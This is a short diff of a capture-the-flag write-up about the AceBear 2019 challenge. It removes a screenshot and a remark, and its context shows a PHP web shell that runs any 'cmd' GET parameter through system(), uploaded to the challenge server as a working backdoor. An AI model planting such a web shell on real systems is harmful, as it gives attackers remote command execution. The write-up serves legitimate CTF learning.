@@ -230,9 +230,6 @@ if(isset($_GET['cmd'])){ echo "<pre>"; $cmd = ($_GET['cmd']); system($cmd); echo
 It Provided a path uploads/a3d7ebbe913126890938bdfe90833490/
 Access them on http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/
 ```
-* <br><br>
-![upload2](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload2.png)
-* Now there is our cmd.php ; use it to RCE<br><br><br>
 ![cmd](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/cmd.png)
 
 * OUR backdoor is working :)
